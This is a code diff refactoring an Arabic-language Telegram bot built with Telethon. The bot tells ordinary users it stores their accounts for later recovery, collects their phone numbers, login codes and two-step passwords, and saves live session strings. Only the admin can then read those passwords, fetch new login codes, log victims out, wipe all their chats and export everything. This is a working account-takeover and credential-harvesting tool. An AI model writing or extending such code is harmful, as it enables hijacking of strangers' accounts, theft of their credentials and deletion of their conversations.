@@ -30,44 +30,33 @@ db = uu('database/elhakem.ss', 'bot')
 if not db.exists("accounts"):
     db.set("accounts", [])
 
+main_buttons = [
+    [Button.inline("➕ إضافة حساب", data="add")],
+    [Button.inline("📲 حساباتك", data="your_accounts")],
+    [Button.inline("💾 نسخة احتياطية", data="backup")],
+    [Button.inline("📂 رفع نسخة احتياطية", data="restore")]
+]
+
 @client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
 async def start(event):
     user_id = event.chat_id
-
     if user_id != admin:
-        buttons = [[Button.inline("➕ إضافة حساب", data="add")]]
-        await event.reply("👋 أهلاً بك عزيزي! هذا البوت مخصص لتخزين حسابات تيليجرام ويمكنك استرجاعها في أي وقت.", buttons=buttons)
+        await event.reply("👋 أهلاً بك عزيزي! هذا البوت مخصص لتخزين حسابات تيليجرام ويمكنك استرجاعها في أي وقت.", buttons=[[Button.inline("➕ إضافة حساب", data="add")]])
         return
 
-    accounts = db.get("accounts")
-    account_count = len(accounts)
-    buttons = [
-        [Button.inline("➕ إضافة حساب", data="add")],
-        [Button.inline(f"📲 حساباتك ({account_count})", data="your_accounts")],
-        [Button.inline("💾 نسخة احتياطية", data="backup")],
-        [Button.inline("📂 رفع نسخة احتياطية", data="restore")]
-    ]
-    await event.reply("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=buttons)
-
+    await event.reply("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=main_buttons)
 
 @client.on(events.callbackquery.CallbackQuery())
-async def start_lis(event):
+async def callback_handler(event):
     data = event.data.decode('utf-8') if isinstance(event.data, bytes) else str(event.data)
     user_id = event.chat_id
     accounts = db.get("accounts")
-    account_count = len(accounts)
-    main_buttons = [
-        [Button.inline("➕ إضافة حساب", data="add")],
-        [Button.inline(f"📲 حساباتك ({account_count})", data="your_accounts")],
-        [Button.inline("💾 نسخة احتياطية", data="backup")],
-        [Button.inline("📂 رفع نسخة احتياطية", data="restore")]
-    ]
 
     if data == "back":
         await event.edit("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=main_buttons)
 
-    if data == "add":
-        async with bot.conversation(event.chat_id) as x:
+    elif data == "add":
+        async with bot.conversation(user_id) as x:
             await x.send_message("✔️الان ارسل رقمك مع رمز دولتك , مثال :+201000000000")
             txt = await x.get_response()
             phone_number = txt.text.replace("+", "").replace(" ", "")
@@ -81,12 +70,10 @@ async def start_lis(event):
             password = None
             try:
                 await app.send_code_request(phone_number)
-            except ApiIdInvalidError:
-                await x.send_message("ʏᴏᴜʀ **API_ID** ᴀɴᴅ **API_HASH** ɪs ɪɴᴠᴀʟɪᴅ.")
+            except (ApiIdInvalidError, PhoneNumberInvalidError):
+                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                 return
-            except PhoneNumberInvalidError:
-                await x.send_message("ᴛʜᴇ **ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ** ʏᴏᴜ'ᴠᴇ sᴇɴᴛ ɪs ɪɴᴠᴀʟɪᴅ.")
-                return
+
             await x.send_message("- تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
             txt = await x.get_response()
             code = txt.text.replace(" ", "")
@@ -97,11 +84,8 @@ async def start_lis(event):
                 accounts.append(data)
                 db.set("accounts", accounts)
                 await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
-            except PhoneCodeInvalidError:
-                await x.send_message("الكود المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
-                return
-            except PhoneCodeExpiredError:
-                await x.send_message("الكود المدخل منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+            except (PhoneCodeInvalidError, PhoneCodeExpiredError):
+                await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                 return
             except SessionPasswordNeededError:
                 await x.send_message("- أرسل رمز التحقق بخطوتين الخاص بحسابك")
@@ -110,7 +94,7 @@ async def start_lis(event):
                 try:
                     await app.sign_in(password=password)
                 except PasswordHashInvalidError:
-                    await x.send_message("رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                    await x.send_message("❌ رمز التحقق بخطوتين المدخل غير صحيح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                     return
                 string_session = app.session.save()
                 data = {"phone_number": phone_number, "two-step": password, "session": string_session}
@@ -118,7 +102,7 @@ async def start_lis(event):
                 db.set("accounts", accounts)
                 await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
 
-    if data == "your_accounts":
+    elif data == "your_accounts":
         if len(accounts) == 0:
             await event.edit("- لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
             return
@@ -127,38 +111,44 @@ async def start_lis(event):
         account_buttons.append([Button.inline("🔙 رجوع", data="back")])
         await event.edit("- اختر الحساب لإدارة الخيارات:", buttons=account_buttons)
 
-    if data.startswith("get_"):
+    elif data.startswith("get_"):
         phone_number = data.split("_")[1]
         for i in accounts:
             if phone_number == i['phone_number']:
                 app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
-                await app.connect()
+                try:
+                    await app.connect()
+                    me = await app.get_me()
+                    sessions = await app(functions.account.GetAuthorizationsRequest())
+                    device_count = len(sessions.authorizations)
 
-                me = await app.get_me()
-                sessions = await app(functions.account.GetAuthorizationsRequest())
-                device_count = len(sessions.authorizations)
+                    text = f"• رقم الهاتف : {phone_number}\n" \
+                           f"- الاسم : {me.first_name} {me.last_name or ''}\n" \
+                           f"- عدد الاجهزة المتصلة : {device_count}\n" \
+                           f"- التحقق بخطوتين : {i['two-step']}"
 
-                text = f"• رقم الهاتف : {phone_number}\n" \
-                       f"- الاسم : {me.first_name} {me.last_name or ''}\n" \
-                       f"- عدد الاجهزة المتصلة : {device_count}\n" \
-                       f"- التحقق بخطوتين : {i['two-step']}"
+                    account_action_buttons = [
+                        [Button.inline("🔒 تسجيل خروج", data=f"logout_{phone_number}")],
+                        [Button.inline("🧹 حذف المحادثات", data=f"delete_chats_{phone_number}")],
+                        [Button.inline("📩 جلب اخر كود", data=f"code_{phone_number}")],
+                        [Button.inline("🔙 رجوع", data="your_accounts")]
+                    ]
+                    await event.edit(text, buttons=account_action_buttons)
+                except Exception as e:
+                    accounts.remove(i)
+                    db.set("accounts", accounts)
+                    await event.edit("⚠️ لم يعد الوصول إلى هذا الحساب ممكناً وتم حذفه من القائمة.")
+                finally:
+                    await app.disconnect()
+                break
 
-                account_action_buttons = [
-                    [Button.inline("🔒 تسجيل خروج", data=f"logout_{phone_number}")],
-                    [Button.inline("🧹 حذف المحادثات", data=f"delete_chats_{phone_number}")],
-                    [Button.inline("📩 جلب اخر كود", data=f"code_{phone_number}")],
-                    [Button.inline("🔙 رجوع", data="your_accounts")]
-                ]
-                await event.edit(text, buttons=account_action_buttons)
-                await app.disconnect()
-
-    if data == "backup":
+    elif data == "backup":
         backup_data = {"accounts": accounts}
         with open("database/backup.json", "w") as backup_file:
             json.dump(backup_data, backup_file)
-        await bot.send_file(user_id, "database/backup.json", caption="تم إنشاء نسخة احتياطية بنجاح ✅")
+        await bot.send_file(user_id, "database/backup.json", caption="✅ تم إنشاء نسخة احتياطية بنجاح.")
 
-    if data == "restore":
+    elif data == "restore":
         async with bot.conversation(user_id) as x:
             await x.send_message("📂 أرسل ملف النسخة الاحتياطية (backup.json)")
             response = await x.get_response()
@@ -169,7 +159,7 @@ async def start_lis(event):
                 db.set("accounts", backup_data["accounts"])
                 await x.send_message("✅ تم استعادة النسخة الاحتياطية بنجاح", buttons=[[Button.inline("🔙 رجوع", data="back")]])
 
-    if data.startswith("logout_"):
+    elif data.startswith("logout_"):
         phone_number = data.split("_")[1]
         for i in accounts:
             if phone_number == i['phone_number']:
@@ -182,7 +172,7 @@ async def start_lis(event):
                 db.set("accounts", accounts)
                 await event.edit(f"- تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
 
-    if data.startswith("code_"):
+    elif data.startswith("code_"):
         phone_number = data.split("_")[1]
         for i in accounts:
             if phone_number == i['phone_number']:
@@ -192,7 +182,7 @@ async def start_lis(event):
                 await event.edit(f"اخر كود تم استلامه: {code[0].message}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                 await app.disconnect()
 
-    if data.startswith("delete_chats_"):
+    elif data.startswith("delete_chats_"):
         phone_number = data.split("_")[2]
         for i in accounts:
             if phone_number == i['phone_number']:
@@ -203,7 +193,7 @@ async def start_lis(event):
                 async for dialog in app.iter_dialogs():
                     await app.delete_dialog(dialog.id)
                     total_deleted += 1
-                    await event.edit(f"جاري الحذف وصل الحذف حتى الآن ({total_deleted})")
+                    await event.edit(f"جاري الحذف... تم حذف ({total_deleted}) محادثة حتى الآن.")
                 
                 await app.disconnect()
                 await event.edit(f"✅ تم حذف جميع المحادثات للحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
